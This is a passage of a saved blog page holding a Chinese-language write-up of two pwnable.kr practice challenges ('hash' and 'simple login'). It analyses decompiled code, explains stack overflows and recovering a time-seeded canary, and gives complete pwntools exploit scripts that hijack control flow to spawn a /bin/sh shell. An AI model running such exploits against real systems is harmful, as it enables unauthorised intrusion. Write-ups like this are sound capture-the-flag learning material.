+  <span class="n">srand</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+  <span class="n">v6</span> <span class="o">=</span> <span class="n">my_hash</span><span class="p">();</span>
+  <span class="n"><span class="hljs-built_in">printf</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"Are you human? input captcha : %d</span></span><span class="se"><span class="hljs-string">\n</span></span><span class="s"><span class="hljs-string">"</span></span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s"><span class="hljs-string">"%d"</span></span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
+  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span> <span class="n">v6</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"wrong captcha!"</span></span><span class="p">);</span>
+    <span class="n"><span class="hljs-built_in">exit</span></span><span class="p">(</span><span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"Welcome! you are authenticated."</span></span><span class="p">);</span>
+  <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"Encode your data with BASE64 then paste me!"</span></span><span class="p">);</span>
+  <span class="n">process_hash</span><span class="p">();</span>
+  <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"Thank you for using our service."</span></span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s"><span class="hljs-string">"echo `date` &gt;&gt; log"</span></span><span class="p">);</span>
+  <span class="k"><span class="hljs-keyword">return</span></span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>通过分析代码可以知道，在输入 Base64 字符串时程序可接收 1024bytes（原始字符串长度 768bytes），但是在 <code class="highlighter-rouge">process_hash</code> 函数处理中保存解码后的缓冲区空间只有 512bytes：</p>
+
+<p>处理输入：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code class="hljs cpp">.text:<span class="hljs-number">08048F</span>E0                 mov     eax, ds:<span class="hljs-built_in">stdin</span>@@GLIBC_2_0
+.text:<span class="hljs-number">08048F</span>E5                 mov     [esp+<span class="hljs-number">8</span>], eax    ; stream
+.text:<span class="hljs-number">08048F</span>E9                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">400</span>h ; n Base64 编码后的字符串 <span class="hljs-number">1024</span>bytes，原始字符串长度最大为 <span class="hljs-number">768</span>bytes (<span class="hljs-number">1024</span> * <span class="hljs-number">3</span> / <span class="hljs-number">4</span>)
+.text:<span class="hljs-number">08048F</span>F1                 mov     dword ptr [esp], offset g_buf ; s
+.text:<span class="hljs-number">08048F</span>F8                 call    _fgets
+</code></pre>
+</div>
+
+<p>Base64 解码处理：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code class="hljs css"><span class="hljs-class">.text</span><span class="hljs-pseudo">:08049015</span>                 <span class="hljs-tag">lea</span>     <span class="hljs-tag">eax</span>, <span class="hljs-attr_selector">[ebp+var_20C]</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:0804901B</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-attr_selector">[esp+4]</span>, <span class="hljs-tag">eax</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:0804901F</span>                 <span class="hljs-tag">mov</span>     <span class="hljs-tag">dword</span> <span class="hljs-tag">ptr</span> <span class="hljs-attr_selector">[esp]</span>, <span class="hljs-tag">offset</span> <span class="hljs-tag">g_buf</span>
+<span class="hljs-class">.text</span><span class="hljs-pseudo">:08049026</span>                 <span class="hljs-tag">call</span>    <span class="hljs-tag">Base64Decode</span>
+</code></pre>
+</div>
+
+<p>（由于开启了 <code class="highlighter-rouge">CANARY</code>，<code class="highlighter-rouge">[ebp+0xc]</code> 存储的是 CANARY 值，<code class="highlighter-rouge">0x20c - 0xc = 512</code> 字节）</p>
+
+<p>这里 768 字节的可输入长度（经 Base64 解码后）超过了可存储缓冲区的 512 字节，形成溢出。但由于 <code class="highlighter-rouge">CANARY</code> 的存在必须要知道准确的 CANARY 值才能够溢出后成功返回控制 PC 指针。</p>
+
+<p>由于 CANARY 值在程序初始化载入运行之前就已经生成，并且在 <code class="highlighter-rouge">my_hash</code> 产生的 HASH 验证值也使用了 CANARY，并且 8 次 <code class="highlighter-rouge">rand()</code> 调用的随机种子为当前的时间值（main() 中已经设置）：</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code class="hljs cpp"><span class="kt"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">my_hash</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">
+</span><span class="p">{</span>
+  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">result</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// eax@4</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v1</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// edx@4</span>
+</span>  <span class="kt"><span class="hljs-keyword">signed</span></span> <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">i</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+0h] [bp-38h]@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">8</span></span><span class="p">];</span> <span class="c1"><span class="hljs-comment">// [sp+Ch] [bp-2Ch]@2</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v4</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+2Ch] [bp-Ch]@1</span>
+</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi"><span class="hljs-number">20</span></span><span class="p">);</span>
+  <span class="k"><span class="hljs-keyword">for</span></span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi"><span class="hljs-number">7</span></span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">nums</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">4</span></span><span class="p">]</span> <span class="o">-</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">6</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">7</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">v4</span> <span class="o">+</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">2</span></span><span class="p">]</span> <span class="o">-</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">3</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">1</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">5</span></span><span class="p">];</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi"><span class="hljs-number">20</span></span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
+  <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>因此可以使用得到的 <code class="highlighter-rouge">Capcha</code> 值和当前时间反推 CANARY 值：</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code class="hljs cpp"><span class="cp"><span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-preprocessor">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+</span>
+<span class="kt"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argc</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argv</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">[])</span></span></span><span class="hljs-function"> </span><span class="p">{</span>
+    <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">t</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi"><span class="hljs-number">1</span></span><span class="p">]);</span>
+    <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">c</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi"><span class="hljs-number">2</span></span><span class="p">]);</span>
+    <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">canary</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span>
+    <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">8</span></span><span class="p">];</span>
+
+    <span class="n">srand</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
+    <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">i</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span>
+    <span class="k"><span class="hljs-keyword">for</span></span><span class="p">(;</span><span class="n">i</span> <span class="o">&lt;=</span> <span class="mi"><span class="hljs-number">7</span></span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">nums</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="c1"><span class="hljs-comment">// c = nums[1] + nums[5] + nums[2] - nums[3] + nums[7] + canary + nums[4] - nums[6]</span>
+</span>    <span class="n">canary</span> <span class="o">=</span> <span class="n">c</span> <span class="o">-</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">1</span></span><span class="p">]</span> <span class="o">-</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">5</span></span><span class="p">]</span> <span class="o">-</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">2</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">3</span></span><span class="p">]</span> <span class="o">-</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">7</span></span><span class="p">]</span> <span class="o">-</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">4</span></span><span class="p">]</span> <span class="o">+</span> <span class="n">nums</span><span class="p">[</span><span class="mi"><span class="hljs-number">6</span></span><span class="p">];</span>
+    <span class="n"><span class="hljs-built_in">printf</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"%x</span></span><span class="se"><span class="hljs-string">\n</span></span><span class="s"><span class="hljs-string">"</span></span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
+
+    <span class="k"><span class="hljs-keyword">return</span></span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>最终构造的 Payload 结构就该为：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code class="hljs cpp">[<span class="hljs-string">'A'</span> * <span class="hljs-number">512</span>]-[CANARY]-[<span class="hljs-string">'A'</span> * <span class="hljs-number">12</span>]-[plt_system]-[<span class="hljs-number">0</span>]-[p(<span class="hljs-string">"/bin/sh"</span>)]
+
+<span class="hljs-number">512</span>bytes + <span class="hljs-number">4</span>bytes + <span class="hljs-number">12</span>bytes + <span class="hljs-number">4</span>bytes + <span class="hljs-number">4</span>bytes + <span class="hljs-number">4</span>bytes = <span class="hljs-number">540</span><span class="hljs-function">bytes
+
+<span class="hljs-title">Base64</span><span class="hljs-params">([<span class="hljs-number">540</span>bytes])</span> </span>==&gt; <span class="hljs-number">720</span>bytes
+</code></pre>
+</div>
+
+<p>因为输入的 Base64 字符串存于 <code class="highlighter-rouge">.bss</code> 段 <code class="highlighter-rouge">0x0804B0E0</code> 处，所以可以将 <code class="highlighter-rouge">/bin/sh</code> 字节添加到输入的字符串后面，结合 Payload 的结构将其写到 <code class="highlighter-rouge">0x0804B0E0 + 720</code> 处，最终 exp 如下：</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment">#!/usr/bin/env python</span></span>
+<span class="c"><span class="hljs-comment"># coding: utf-8</span></span>
+
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">os</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">re</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">time</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">random</span>
+<span class="kn"><span class="hljs-keyword">import</span></span> <span class="nn">urllib2</span>
+
+<span class="kn"><span class="hljs-keyword">from</span></span> <span class="nn">pwn</span> <span class="kn"><span class="hljs-keyword">import</span></span> <span class="o">*</span>
+
+<span class="c"><span class="hljs-comment"># elf = ELF('./hash')</span></span>
+<span class="c"><span class="hljs-comment"># plt_system = elf.plt['system']</span></span>
+<span class="n">plt_system</span> <span class="o">=</span> <span class="mh"><span class="hljs-number">0x08048880</span></span>
+
+<span class="c"><span class="hljs-comment"># Local EXP</span></span>
+<span class="n">t</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+<span class="c"><span class="hljs-comment"># p = process('./hash')</span></span>
+
+<span class="c"><span class="hljs-comment"># Remote EXP</span></span>
+<span class="c"><span class="hljs-comment"># date = urllib2.urlopen('http://pwnable.kr').headers['Date']</span></span>
+<span class="c"><span class="hljs-comment"># t = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))</span></span>
+<span class="c"><span class="hljs-comment"># t += random.randint(0, 3)</span></span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s"><span class="hljs-string">'127.0.0.1'</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">9002</span></span><span class="p">)</span>
+
+<span class="n">capcha</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s"><span class="hljs-string">r'(-?[</span></span><span class="err"><span class="hljs-string">\</span></span><span class="s"><span class="hljs-string">d]+)'</span></span><span class="p">,</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline_regex</span><span class="p">(</span><span class="s"><span class="hljs-string">r'(-?[</span></span><span class="err"><span class="hljs-string">\</span></span><span class="s"><span class="hljs-string">d]{5,})'</span></span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">capcha</span><span class="p">)</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="s"><span class="hljs-string">'0x'</span></span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s"><span class="hljs-string">'./hashc {} {}'</span></span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">t</span><span class="p">),</span> <span class="n">capcha</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span> <span class="mi"><span class="hljs-number">16</span></span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s"><span class="hljs-string">'A'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">512</span></span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="s"><span class="hljs-string">'A'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">12</span></span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh"><span class="hljs-number">0x8048a00</span></span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh"><span class="hljs-number">0x0804B0E0</span></span> <span class="o">+</span> <span class="mi"><span class="hljs-number">540</span></span><span class="o">*</span><span class="mi"><span class="hljs-number">4</span></span><span class="o">/</span><span class="mi"><span class="hljs-number">3</span></span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">b64e</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">+</span> <span class="s"><span class="hljs-string">'/bin/sh</span></span><span class="se"><span class="hljs-string">\0</span></span><span class="s"><span class="hljs-string">'</span></span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre>
+</div>
+
+<h3 id="simple-login">[simple login]</h3>
+
+<blockquote>
+  <p>Can you get authentication from this server?</p>
+
+  <p>Download : http://pwnable.kr/bin/login</p>
+
+  <p>Running at : nc pwnable.kr 9003</p>
+</blockquote>
+
+<p><code class="highlighter-rouge">login</code> 为 32 位 ELF 程序，简单使用 IDA 分析程序，可以得到主要程序逻辑：</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code class="hljs cpp"><span class="kt"><span class="hljs-keyword">int</span></span> <span class="kr">__<span class="hljs-function">cdecl</span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argc</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">**</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">argv</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">**</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">envp</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
+</span><span class="p">{</span>
+  <span class="kt"><span class="hljs-keyword">char</span></span> <span class="n">v3</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// ST04_1@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v5</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+18h] [bp-28h]@1</span>
+</span>  <span class="kr">__int16</span> <span class="n">v6</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+1Eh] [bp-22h]@1</span>
+</span>  <span class="kt"><span class="hljs-keyword">unsigned</span></span> <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">v7</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [sp+3Ch] [bp-4h]@1</span>
+</span>
+  <span class="n"><span class="hljs-built_in">memset</span></span><span class="p">(</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mh"><span class="hljs-number">0x1E</span>u</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n"><span class="hljs-built_in">stdout</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">2</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n"><span class="hljs-built_in">stdin</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
+  <span class="n"><span class="hljs-built_in">printf</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"Authenticate : "</span></span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
+  <span class="n">_isoc99_scanf</span><span class="p">(</span><span class="s"><span class="hljs-string">"%30s"</span></span><span class="p">,</span> <span class="p">(</span><span class="kt"><span class="hljs-keyword">unsigned</span></span> <span class="kt"><span class="hljs-keyword">int</span></span><span class="p">)</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">);</span>
+  <span class="n"><span class="hljs-built_in">memset</span></span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mh"><span class="hljs-number">0xC</span>u</span><span class="p">);</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span>
+  <span class="n">v7</span> <span class="o">=</span> <span class="n">Base64Decode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
+  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&gt;</span> <span class="mh"><span class="hljs-number">0xC</span></span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n"><span class="hljs-built_in">puts</span></span><span class="p">(</span><span class="s"><span class="hljs-string">"Wrong Length"</span></span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k"><span class="hljs-keyword">else</span></span>
+  <span class="p">{</span>
+    <span class="n"><span class="hljs-built_in">memcpy</span></span><span class="p">(</span><span class="o">&amp;</span><span class="n">input</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">v7</span><span class="p">);</span>
+    <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span> <span class="n">auth</span><span class="p">(</span><span class="n">v7</span><span class="p">)</span> <span class="o">==</span> <span class="mi"><span class="hljs-number">1</span></span> <span class="p">)</span>
+      <span class="n">correct</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k"><span class="hljs-keyword">return</span></span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<p>这里经过 <code class="highlighter-rouge">Base64Decode()</code> 函数解码后字符串长度不能超过 12bytes，而在 <code class="highlighter-rouge">auth()</code> 函数中通过 <code class="highlighter-rouge">memcpy()</code> 函数将解码后的字符串复制到自己的函数堆栈中：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code class="hljs cpp">.text:<span class="hljs-number">080492</span>A2                 mov     eax, [ebp+arg_0]
+.text:<span class="hljs-number">080492</span>A5                 mov     [esp+<span class="hljs-number">8</span>], eax    ; i_buf_length (max=<span class="hljs-number">0xc</span>)
+.text:<span class="hljs-number">080492</span>A9                 mov     dword ptr [esp+<span class="hljs-number">4</span>], offset input ; base64 decode <span class="hljs-built_in">string</span>
+.text:<span class="hljs-number">080492</span>B1                 lea     eax, [ebp+var_14]
+.text:<span class="hljs-number">080492</span>B4                 add     eax, <span class="hljs-number">0</span>Ch        ; [ebp-<span class="hljs-number">0x8</span>] buff[<span class="hljs-number">8</span>]
+.text:<span class="hljs-number">080492</span>B7                 mov     [esp], eax
+.text:<span class="hljs-number">080492</span>BA                 call    <span class="hljs-built_in">memcpy</span>          ; <span class="hljs-built_in">memcpy</span>(&amp;(ebp-<span class="hljs-number">0x8</span>), &amp;b64d_str, <span class="hljs-number">0xc</span>)
+</code></pre>
+</div>
+
+<p>这里可以看到 <code class="highlighter-rouge">auth()</code> 函数中只使用了 8bytes 来存储 Base64 解码后的字符串，而允许的解码后的字符串长度为 12bytes，溢出的 4bytes 刚好覆盖了 <code class="highlighter-rouge">ebp</code> 的值，在 <code class="highlighter-rouge">auth()</code> 函数返回执行 <code class="highlighter-rouge">leave; ret</code> 从而可以控制程序流程，因为输入字符串和解码后的字符串都存在了 <code class="highlighter-rouge">.bss 0x0811EB40</code> 地址上，所以直接覆盖 <code class="highlighter-rouge">ebp</code> 值为 <code class="highlighter-rouge">input</code> 变量的地址，并在 <code class="highlighter-rouge">0x0811EB40 + 4</code> 处写入需要 RET 的地址即可。</p>
+
+<p>程序中已经准备好了 <code class="highlighter-rouge">system("/bin/sh")</code>，所以直接将返回地址控制到该处即可，最终 exp 如下：</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code class="hljs python"><span class="c"><span class="hljs-comment">#!/usr/bin/env python</span></span>
+<span class="c"><span class="hljs-comment"># coding: utf-8</span></span>
+
+<span class="kn"><span class="hljs-keyword">from</span></span> <span class="nn">pwn</span> <span class="kn"><span class="hljs-keyword">import</span></span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s"><span class="hljs-string">'./login'</span></span><span class="p">)</span>
+
+<span class="n">ebp_over</span> <span class="o">=</span> <span class="mh"><span class="hljs-number">0x0811EB40</span></span>  <span class="c"><span class="hljs-comment"># input .bss</span></span>
+<span class="n">pp_system</span> <span class="o">=</span> <span class="mh"><span class="hljs-number">0x08049284</span></span> <span class="c"><span class="hljs-comment"># system("/bin/sh")</span></span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">b64e</span><span class="p">(</span><span class="s"><span class="hljs-string">'A'</span></span> <span class="o">*</span> <span class="mi"><span class="hljs-number">4</span></span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pp_system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ebp_over</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre>
+</div>
+
+    </div>
+    
+    <div id="disqus_thread"><iframe id="dsq-app5501" name="dsq-app5501" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./Rookiss Writeup [pwnable.kr]_files/saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 650px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
+<script type="text/javascript">
+var disqus_shortname = "rickgrayblog";
+
+/* * * DON'T EDIT BELOW THIS LINE * * */
+(function() {
+var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the &lt;a href="http://disqus.com/?ref_noscript"&gt;comments powered by Disqus.&lt;/a&gt;</noscript>
+
+  </div>
+</div>
+
+<div class="am-container lp-container">
+  <footer class="am-footer lp-footer">
+    <p>Copyright © 2014-2016 All Rights Reserved</p>
+    <p>Theme By <a href="https://github.com/RickGray/light-post">LightPost</a></p>
+  
+</footer></div>
+
+
+<div data-am-widget="gotop" class="am-gotop am-gotop-fixed am-no-layout am-active">
+  <a href="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html#top" title="回到顶部">
+    <span class="am-gotop-title">GoTop</span>
+    <i class="am-gotop-icon am-icon-chevron-up"></i>
+  </a>
+</div>
+
+<script src="./Rookiss Writeup [pwnable.kr]_files/jquery.min.js"></script>
+<script src="./Rookiss Writeup [pwnable.kr]_files/amazeui.min.js"></script>
+<script>
+$(document).ready(function(){
+  $.AMUI.progress.start();
+});
+$(window).load(function(){
+  $.AMUI.progress.done();
+});
+</script>
